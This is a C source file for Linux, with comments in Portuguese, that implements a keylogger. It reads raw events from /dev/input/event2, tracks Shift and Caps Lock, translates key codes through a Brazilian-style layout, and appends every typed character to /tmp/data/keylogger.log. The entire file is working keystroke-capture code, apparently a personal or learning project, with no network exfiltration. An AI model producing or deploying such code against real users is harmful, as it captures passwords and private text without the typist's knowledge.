#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <linux/input.h>
#include <errno.h>
#include <X11/XKBlib.h>
#include <X11/Xlib.h>

//sudo apt-get install libx11-dev

#define TRUE 1
#define FALSE 0

#define LOGFILE "/tmp/data/keylogger.log"

// Função auxiliar para detectar o estado do Caps Lock
int is_capslock_active(){
    Display *d = XOpenDisplay(NULL);
    if (d == NULL) {
        fprintf(stderr, "Erro ao abrir display X\n");
        exit(EXIT_FAILURE);
    }
    XkbStateRec xkbState;
    XkbGetState(d, XkbUseCoreKbd, &xkbState);
    int capslock = (xkbState.locked_mods & LockMask) != 0;
    XCloseDisplay(d);
    printf("tecla capslock está %d\n", capslock);
    return capslock;
}

int main(int argc, char **argv) {
    struct input_event ev;
    char *map =            "..1234567890-=..qwertyuiop....asdfghjkl.....zxcvbnm,.;...";
    char *map_shift =      "..!@#$%.&*()_+..QWERTYUIOP....ASDFGHJKL.....ZXCVBNM<>;...";
    char *map_caps =       "..1234567890-=..QWERTYUIOP....ASDFGHJKL.....ZXCVBNM,.;...";
    char *map_caps_shift = "..!@#$%.&*()_+..qwertyuiop....asdfghjkl.....zxcvbnm<>;...";

    int fd = open("/dev/input/event2", O_RDONLY);
    if (fd == -1) {
        perror("Erro ao abrir dispositivo de entrada");
        exit(EXIT_FAILURE);
    }

    FILE *fp = fopen(LOGFILE, "a");
    if (fp == NULL) {
        perror("Erro ao abrir arquivo de log");
        close(fd);
        exit(EXIT_FAILURE);
    }

    int est_shift_e = 0;
    int est_shift_d = 0;
    int est_capslock = 0;//= is_capslock_active();

    //shift esquerdo = 42, capslock = 58, shift direito = 54

    while(TRUE) {
        read(fd, &ev, sizeof(ev));
        if (ev.type == EV_KEY) {
            // shift pressionado -> ativado!
            if (ev.value == 1) {
                if(ev.code == 42) {
                    est_shift_e = 1;
                    fprintf(fp, "tecla número: %d = shift esq ajustado para %d\n", ev.value, est_shift_e);
                }
                else if(ev.code == 54) {
                    est_shift_d = 1;
                    fprintf(fp, "tecla número: %d = shift dir ajustado para %d\n", ev.value, est_shift_d);
                }
            }
            // shit solto -> desativado!
            else if (ev.value == 0) {
                fprintf(fp, "tecla número: %d = ", ev.code);
                if(ev.code == 42) {
                    est_shift_e = 0;
                    fprintf(fp, "shift esq ajustado para %d\n", est_shift_e);
                }
                else if(ev.code == 54) {
                    est_shift_d = 0;
                    fprintf(fp, "shift dir ajustado para %d\n", est_shift_d);
                }
            }

            if(ev.value == 0) {
                // a tecla foi solta
                if(ev.code == 58) { //caso de alternar o capslock
                    est_capslock = !est_capslock;
                    fprintf(fp, "capslock ajustada para %d\n", est_capslock);
                }
                //shift e caps desativado (map)
                else if(est_shift_e == 0 && est_shift_d == 0 && est_capslock == 0) {
                    switch (ev.code){
                        case 26:
                            fprintf(fp, "´");
                        break;

                        case 27:
                            fprintf(fp, "[");
                        break;

                        case 28:
                            fprintf(fp, "\n");
                        break;

                        case 41:
                            fprintf(fp, "'");
                        break;

                        case 43:
                            fprintf(fp, "]");
                        break;

                        case 40:
                            fprintf(fp, "~");
                        break;

                        case 53:
                            fprintf(fp, ";");
                        break;

                        //case 57:
                        //    fprintf(fp, " ");
                        //break;

                        case 89:
                            fprintf(fp, "/");
                        break;

                        case 103:
                            fprintf(fp, "seta para cima");
                        break;

                        case 105:
                            fprintf(fp, "seta para esquerda");
                        break;

                        case 106:
                            fprintf(fp, "seta para direita");
                        break;

                        case 108:
                            fprintf(fp, "seta para baixo");
                        break;

                        case 86:
                            fprintf(fp, "\\");
                        break;

                        case 39:
                            fprintf(fp, "ç");
                        break;

                        default:
                            fprintf(fp, "%c", map[ev.code]);
                    }
                }

                //casos com shift ativo (inclui caps ativo ou não)
                else if(est_shift_e == 1 || est_shift_d == 1) {
                    //shift e capslock ativos (map_caps_shift)
                    if(est_capslock == 1) {
                        switch (ev.code){
                            case 7:
                                fprintf(fp, "¨");
                            break;

                            case 26:
                                fprintf(fp, "`");
                            break;

                            case 27:
                                fprintf(fp, "{");
                            break;

                            case 28:
                                fprintf(fp, "\n");
                            break;

                            case 41:
                                fprintf(fp, "\"");
                            break;

                            case 43:
                                fprintf(fp, "}");
                            break;

                            case 40:
                                fprintf(fp, "^");
                            break;

                            case 53:
                                fprintf(fp, ":");
                            break;

                            //case 57:
                            //    fprintf(fp, " ");
                            //break;

                            case 89:
                                fprintf(fp, "?");
                            break;

                            case 103:
                                fprintf(fp, "seta para cima");
                            break;

                            case 105:
                                fprintf(fp, "seta para esquerda");
                            break;

                            case 106:
                                fprintf(fp, "seta para direita");
                            break;

                            case 108:
                                fprintf(fp, "seta para baixo");
                            break;

                            case 86:
                                fprintf(fp, "|");
                            break;

                            case 39:
                                fprintf(fp, "ç");
                            break;

                            default:
                                fprintf(fp, "%c", map_caps_shift[ev.code]);
                        }
                    }
                    //apenas shift ativo (map_shift)
                    else {
                        switch (ev.code){
                            case 7:
                                fprintf(fp, "¨");
                            break;

                            //case 8:
                            //    fprintf(fp, "&");
                            //break;

                            case 26:
                                fprintf(fp, "`");
                            break;

                            case 27:
                                fprintf(fp, "{");
                            break;

                            case 28:
                                fprintf(fp, "\n");
                            break;

                            case 41:
                                fprintf(fp, "\"");
                            break;

                            case 43:
                                fprintf(fp, "}");
                            break;

                            case 40:
                                fprintf(fp, "^");
                            break;

                            //case 53:
                            //    fprintf(fp, ":");
                            //break;

                            //case 57:
                            //    fprintf(fp, " ");
                            //break;

                            case 89:
                                fprintf(fp, "?");
                            break;

                            case 103:
                                fprintf(fp, "seta para cima");
                            break;

                            case 105:
                                fprintf(fp, "seta para esquerda");
                            break;

                            case 106:
                                fprintf(fp, "seta para direita");
                            break;

                            case 108:
                                fprintf(fp, "seta para baixo");
                            break;

                            case 86:
                                fprintf(fp, "|");
                            break;

                            case 39:
                                fprintf(fp, "Ç");
                            break;

                            default:
                                fprintf(fp, "%c", map_shift[ev.code]);
                        }
                    }
                }

                //apenas capslock ativo (map_caps)
                else {
                    switch (ev.code){
                        case 26:
                            fprintf(fp, "´");
                        break;

                        case 27:
                            fprintf(fp, "[");
                        break;

                        case 28:
                            fprintf(fp, "\n");
                        break;

                        case 41:
                            fprintf(fp, "'");
                        break;

                        case 43:
                            fprintf(fp, "]");
                        break;

                        case 40:
                            fprintf(fp, "~");
                        break;

                        case 53:
                            fprintf(fp, ";");
                        break;

                        //case 57:
                        //    fprintf(fp, " ");
                        //break;

                        case 89:
                            fprintf(fp, "/");
                        break;

                        case 103:
                            fprintf(fp, "seta para cima");
                        break;

                        case 105:
                            fprintf(fp, "seta para esquerda");
                        break;

                        case 106:
                            fprintf(fp, "seta para direita");
                        break;

                        case 108:
                            fprintf(fp, "seta para baixo");
                        break;

                        case 86:
                            fprintf(fp, "\\");
                        break;

                        case 39:
                            fprintf(fp, "Ç");
                        break;

                        default:
                            fprintf(fp, "%c", map_caps[ev.code]);
                    }
                }
                fflush(fp);
                fprintf(fp, "\n");
                fflush(fp);
            }
        }
    }


    fclose(fp);
    close(fd);
    return 0;
}
